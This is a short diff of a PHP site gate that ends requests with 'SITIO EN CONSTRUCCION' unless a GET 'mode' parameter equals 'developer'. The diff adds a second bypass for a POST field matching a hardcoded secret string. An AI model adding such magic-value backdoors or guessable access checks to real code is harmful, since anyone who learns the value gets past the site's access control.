@@ -4,7 +4,7 @@
         die("hjS3r%mDs-5gYa6ib_5Ps");
     }
 
-    if($_GET["mode"] != "developer"){
+    if($_GET["mode"] != "developer" && $_POST["accion"] != "xS3w1Dm8Po87Wltd"){
         die("SITIO EN CONSTRUCCION");
     }
 
